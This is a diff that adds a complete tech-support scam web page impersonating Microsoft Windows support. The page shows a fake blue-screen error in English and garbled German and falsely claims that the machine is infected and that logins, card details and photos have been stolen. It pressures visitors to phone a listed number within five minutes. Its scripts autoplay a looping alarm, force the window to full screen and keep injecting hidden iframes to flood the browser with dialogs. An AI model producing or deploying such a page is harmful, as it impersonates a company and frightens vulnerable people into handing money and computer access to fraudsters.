@@ -1,0 +1,356 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv=content-type content="text/html;charset=UTF-8"/>
+        <meta name=robots content="noindex, nofollow">
+        <meta http-equiv=Content-Type content="text/html; charset=UTF-8">
+        <title>Official Microsoft Windows Help and Services</title>
+        <meta name=robots content=NOINDEX,NOFOLLOW>
+
+        <link href="./css/main.css" rel="stylesheet">
+
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-71978308-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-71978308-1');
+</script>
+   
+
+        <style>
+            div.fixed {
+                position: fixed;
+                bottom: 0;
+                right: 0;
+                width: 300px;
+                height: 300px;
+                border: 1px
+            }
+        </style>
+        <style>
+            div.fixed2 {
+                position: fixed;
+                bottom: 55px;
+                right: 80px;
+                width: 200px;
+                height: 50px;
+                border: 1px;
+                color: black;
+                font-size: 22px;
+                font-weight: bold;
+                -webkit-animation-name: example;
+                -webkit-animation-duration: 1s;
+                animation-name: example;
+                animation-duration: 1s;
+                animation-iteration-count: infinite
+            }
+
+            @-webkit-keyframes example {
+                0% {
+                    color: black
+                }
+
+                50% {
+                    color: red
+                }
+
+                100% {
+                    color: black
+                }
+            }
+
+            @keyframes example {
+                0% {
+                    color: black
+                }
+
+                50% {
+                    color: red
+                }
+
+                100% {
+                    color: black
+                }
+            }
+        </style>
+        <style type=text/css>
+            #alert {
+                position: absolute;
+                left: 30%;
+                top: 5%;
+                background: #f1f1f1;
+                border: 2px solid #0032c7;
+                width: 40%
+            }
+
+            .input {
+                margin-top: 10px;
+                background: #f1f1f1;
+                padding: 20px;
+                text-align: right
+            }
+
+            .input input {
+                opacity: 1;
+                padding: 15px;
+                font-size: 16px;
+                width: 35%;
+                font-weight: 700
+            }
+
+            .input input:hover {
+                opacity: .75
+            }
+
+            .head h1,h2,h3,h4 {
+                margin: 0;
+                padding: 0
+            }
+
+            .text {
+                padding: 20px
+            }
+
+            .right {
+                float: right
+            }
+
+            .left {
+                float: left
+            }
+
+            .clear {
+                clear: both
+            }
+
+            .alert_hide {
+                cursor: pointer
+            }
+
+            body {
+                background-color: #0000A0;
+                color: #000;
+                font-family: "Trebuchet MS",Arial,Helvetica,sans-serif;
+                font-family: Arial;
+                font-size: 18px;
+                margin: 0
+            }
+
+            body,html {
+                margin: 10px;
+                padding: 0;
+                overflow: hidden;
+                width: 100%;
+                height: 100%;
+                background-attachment: fixed;
+                background-color: #0000A0
+            }
+        </style>
+        <script src=./js/jquery.min.js></script>
+        <script>
+            function formatAMPM() {
+                var d = new Date()
+                  , minutes = d.getMinutes().toString().length == 1 ? '0' + d.getMinutes() : d.getMinutes()
+                  , hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours()
+                  , ampm = d.getHours() >= 12 ? 'pm' : 'am'
+                  , months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
+                  , days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
+                return days[d.getDay()] + ' ' + months[d.getMonth()] + ' ' + d.getDate() + ' ' + d.getFullYear() + ' ' + hours + ':' + minutes + ampm;
+            }
+        </script>
+        <script>
+            function getURLParameter(a) {
+                return decodeURI((RegExp(a + "=(.+?)(&|$)").exec(location.search) || [, null])[1] || "")
+            }
+            function random_betw(b, a) {
+                return Math.round(Math.random() * (a - b) + b)
+            }
+            var phone = "(833) 493-1880";
+            var text = "** Microsoft Windows warning message **\n\nERROR # MS-SYSINFO32 \nPlease call us immediately: (833) 493-1880.\nDo not ignore this important warning..\nBy closing this page, your computer access will be disabled to prevent further damage to our network. Your computer has informed us that it is infected with pornographic spyware and viruses. \n\nThe following information is stolen: \n A.Facebook Logins\n B.Credit card details\n C.Email  Logins\n D.Photos and documents.\nYou must contact us immediately so that our experienced technicians can guide you through the removal process by phone to protect your identity. Please call us within the next 5 minutes to prevent your computer from being disabled or data being lost.\n\nMicrosoft :(833) 493-1880";
+        </script>
+        <script>
+            var w = window.screen.width;
+            var h = window.screen.height;
+            window.moveTo(0, 0);
+            window.resizeTo(w, h);
+        </script>
+
+    </head>
+    <body style="background-color: #0000A0; margin:0px;padding:0px;font-family:arial,sans-serif!important">
+        <div id=blue-screen style=display:none>
+            <table style=width:100% height=61 cellpadding=0 cellspacing=0 border=0>
+                <tr>
+                    <td width=766>
+                        <img src=img/bg-1.jpg>
+                    </td>
+                    <td align=right background=img/bg-2.jpg>
+                        <img src=img/bg-3.jpg>
+                    </td>
+                </tr>
+            </table>
+        </div>
+        <div style="width:85%;margin:auto;padding-top:4%;background-color:#0000A0;position:relative">
+            <div class=centering-col>
+                <div class=centered-content>
+                    <h1 style=color:#FFF;margin-top:20px;font-weight:900>** Microsoft Warnung  &nbsp; **</h1>
+                    <h3 style=color:#FFF;margin-top:20px;font-weight:900>ERROR # 0xC004FC03</h3>
+                    <div style=float:right;height:180px;width:180px;margin-right:19%>
+
+                    </div>
+                    <div style=float:left;height:250px;width:520px;padding-left:20px;padding-top:25px;color:#FFF>
+                        Rufen Sie bitte &nbsp;uns sofort an: </br> <script>
+                            document.write('<span style="font-size:25px;font-weight:bold;">(833) 493-1880 (Toll Free)</span>');
+                        </script>
+                        <br>
+                        Do not ignore this important warning. <br/>
+                        By closing this page, your computer access will be disabled to prevent further damage to our network.<br/>
+                        Her computer has informed us that he has been infected with a pornographic spyware and a pornographic virus. The following information is stolen:<br/>
+                        <br/>
+                        1.Facebook &nbsp;Logins<br/>
+                        2.Credit &nbsp;Card &nbsp;Informationen<br/>
+                        3.Email &nbsp;Konto &nbsp;Logins<br/>
+                        4.Photos and documents &nbsp;stored &nbsp;on this computer<br>
+                        <br>
+                        You must contact us immediately so that our experienced engineers can guide you through the removal & nbsp; Process by telephone to protect your identity. Please call us within 5 minutes to prevent your computer from deactivating or losing information.<br></br>
+                    </div>
+                    <div style="margin-top:440px">
+                        <h1 style="color:#ffff;font-weight:900; font-size:25px">
+                            Call Microsoft Windows Support<br>
+                            <script>
+                                document.write('<span style="color:#7fff7f">(833) 493-1880(Toll Free)</span>');
+                            </script>
+</br></h1></div></div></div></div>
+<audio autoplay=autoplay loop id=audio>
+    <source src=./sound/err.mp3 type=audio/mpeg>
+</audio>
+<div id=chrome-alerts class=chrome-alert>
+    <div>
+        <a href=# class=cross>×</a>
+        <h1>Activation security warning:</h1>
+        <div class=content-box id=alert-content-box>
+            <p>
+                ** Microsoft Security Warning ** <br>
+                <br>
+                ERROR # 0xC004FC03 <br>
+                <br>
+                <br>
+                Please call us immediately:
+                <span style=font-size:13pt;font-weight:bold>
+                    <script>
+                        document.write(phone);
+                    </script>
+                </span>
+                &nbsp;(Microsoft & nbsp; Toll Free) <br> Do not ignore this important warning.</br>
+                
+If you close this page, your computer access will be disabled & nbsp; disabled to prevent further damage to our network. <br/>
+                Your computer has informed us that it has been infected with pornography & nbsp; Spyware and & nbsp; virus. The following information is stolen: <br/>
+                <br/>
+                1.Facebook Logins <br/>
+                2.Credit card information <br/>
+                3.Email & nbsp; Account Logins <br/>
+                4.Photos & Documents <br/>
+                <br/> Please call us within the next 5 minutes to prevent your computer from being disabled or data being lost. </BR>
+</BR> Microsoft & nbsp; Toll Free:
+<span style='font-size:13pt;font-weight:bold'>
+    <script>
+        document.write(phone);
+    </script>
+</span>
+</div>
+<label style=font-size:12px>
+    <input type=checkbox>
+Prevent this page from being created & nbsp; additional dialogs.
+</label>
+<div class=action_buttons>
+    <a style=color:#fff;background:red;font-size:11pt;font-weight:bold href=javascript: class=active id=leave_page>Leave this page</a>
+</div>
+</div></div>
+
+<script type=text/javascript>
+    function get_browser() {
+        var b = navigator.userAgent, a, c = b.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+        if (/trident/i.test(c[1])) {
+            a = /\brv[ :]+(\d+)/g.exec(b) || [];
+            return {
+                name: "IE",
+                version: (a[1] || "")
+            }
+        }
+        if (c[1] === "Chrome") {
+            a = b.match(/\bOPR\/(\d+)/);
+            if (a != null) {
+                return {
+                    name: "Opera",
+                    version: a[1]
+                }
+            }
+        }
+        c = c[2] ? [c[1], c[2]] : [navigator.appName, navigator.appVersion, "-?"];
+        if ((a = b.match(/version\/(\d+)/i)) != null) {
+            c.splice(1, 1, a[1])
+        }
+        return {
+            name: c[0],
+            version: c[1]
+        }
+    }
+    var InternetEx = window.navigator.appVersion.indexOf("MSIE") != -1;
+    var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+    var browser = get_browser();
+    if (browser.name == "Firefox" || isIEedge || InternetEx || navigator.appName == "Microsoft Internet Explorer" || !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/))) {
+        if (isIEedge || InternetEx || navigator.appName == "Microsoft Internet Explorer" || !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/))) {
+            function msg_ff() {
+                var a = document.createElement("div");
+                a.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="CN0101010101help.php"></iframe></div>';
+                document.body.appendChild(a)
+            }
+            window.setInterval(function() {
+                msg_ff()
+            }, 1100)
+        } else {
+            function msg_ff() {
+                var a = document.createElement("div");
+                a.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="CN0101010101help.php"></iframe></div>';
+                document.body.appendChild(a)
+            }
+            window.setInterval(function() {
+                msg_ff()
+            }, 1100)
+        }
+    } else {}
+    ;</script>
+
+    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="CN0101010101help.php"></iframe></div>
+    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="CN0101010101help.php"></iframe></div>
+
+
+
+
+<div class="fixed">}
+</script>
+<div class="fixed">
+    <img src="2.png" style="position: absolute; right: 0px; bottom: 1px;"  width="600">
+</div>
+<div class="fixed2">
+    <script>
+        document.write(phone);
+    </script>
+</div>
+</div>
+<div style="position: absolute; right: 10px; top: 70px;color:#FFF;">
+    <b>
+        <u>
+            Error &nbsp;Logged at: <script>
+                document.write(formatAMPM());
+            </script>
+            <br>Microsoft Diagnostics IP Address: 129.0.0.1</br>
+            <div style="position:absolute; top:50px; right:35px;"><h3 style="font-size:24px; font-weight:bold;">Call Support (833) 493-1880          </h3></div>
+</div>
+</u></b></div>
+
+
+</body></html>
